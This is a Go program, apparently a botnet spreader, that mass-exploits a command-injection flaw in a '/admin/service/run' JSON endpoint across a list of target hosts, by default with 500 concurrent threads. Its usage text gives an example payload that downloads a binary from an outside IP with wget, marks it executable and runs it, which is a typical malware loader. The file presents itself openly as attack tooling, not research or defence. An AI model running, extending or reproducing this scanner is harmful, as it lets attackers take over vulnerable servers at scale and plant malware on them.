package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

/* ============================================================================
 * RANDOX86 EXPLOIT SCANNER - Command Injection Module
 * ============================================================================
 * Exploits command injection vulnerability in /admin/service/run endpoint
 * Targets: Devices with exposed Randox86 service control interface
 * Method: JSON-based command injection via service/run API
 * Global coverage: Cloud providers, VPS, dedicated servers
 * ============================================================================ */

type RandoxResult struct {
	IP       string
	Port     string
	Endpoint string
	Success  bool
	Response string
}

func exploitRandox(targetURL, cmd string, wg *sync.WaitGroup, results chan<- RandoxResult, sem chan struct{}) {
	defer wg.Done()

	sem <- struct{}{}
	defer func() { <-sem }()

	// Build JSON payload
	payload := fmt.Sprintf(`{"service":"run","command":"%s"}`, cmd)

	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	response := string(body)

	// Check for successful exploitation
	if resp.StatusCode == 200 || 
	   strings.Contains(response, "success") || 
	   strings.Contains(response, "OK") ||
	   strings.Contains(response, "result") ||
	   len(response) > 0 {

		results <- RandoxResult{
			IP:       targetURL,
			Port:     "80",
			Endpoint: "/admin/service/run",
			Success:  true,
			Response: response,
		}
	}
}

func loadTargets(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Validate URL format
		if strings.HasPrefix(line, "http://") || strings.HasPrefix(line, "https://") {
			targets = append(targets, line)
		} else {
			// Assume HTTP if no protocol specified
			targets = append(targets, "http://"+line)
		}
	}

	return targets, scanner.Err()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./randox86 <valid.txt> <command> [threads]")
		fmt.Println("Example: ./randox86 valid.txt 'wget http://1.2.3.4/bins/axis.x86;chmod +x /tmp/a;/tmp/a' 500")
		fmt.Println("")
		fmt.Println("Arguments:")
		fmt.Println("  valid.txt  - File containing target URLs (one per line)")
		fmt.Println("  command    - Shell command to execute on vulnerable targets")
		fmt.Println("  threads    - Number of concurrent threads (default: 500)")
		fmt.Println("")
		fmt.Println("Target format in valid.txt:")
		fmt.Println("  http://IP/admin/service/run")
		fmt.Println("  http://IP:PORT/admin/service/run")
		os.Exit(1)
	}

	targetFile := os.Args[1]
	command := os.Args[2]
	threads := 500
	if len(os.Args) > 3 {
		threads, _ = strconv.Atoi(os.Args[3])
	}

	fmt.Printf("[*] AXIS 3.0 Randox86 Exploit Scanner\n")
	fmt.Printf("[*] Loading targets from: %s\n", targetFile)
	fmt.Printf("[*] Command: %s\n", command)
	fmt.Printf("[*] Using %d concurrent threads\n", threads)

	targets, err := loadTargets(targetFile)
	if err != nil {
		fmt.Printf("[-] Error loading targets: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Loaded %d targets\n", len(targets))
	fmt.Printf("[*] Starting exploitation...\n\n")

	var wg sync.WaitGroup
	results := make(chan RandoxResult, 100)
	sem := make(chan struct{}, threads)

	// Start result writer
	go func() {
		f, _ := os.OpenFile("randox86_results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer f.Close()

		for result := range results {
			if result.Success {
				line := fmt.Sprintf("%s | %s | Response: %s\n", result.IP, result.Endpoint, result.Response)
				f.WriteString(line)
				fmt.Printf("[+] RANDOX86 EXPLOITED: %s%s\n", result.IP, result.Endpoint)
				fmt.Printf("    Response: %s\n\n", result.Response)
			}
		}
	}()

	startTime := time.Now()

	for _, target := range targets {
		wg.Add(1)
		go exploitRandox(target, command, &wg, results, sem)
	}

	wg.Wait()
	close(results)

	elapsed := time.Since(startTime)
	fmt.Printf("\n[*] Randox86 exploitation completed in %s\n", elapsed)
	fmt.Printf("[*] Results saved to: randox86_results.txt\n")
}
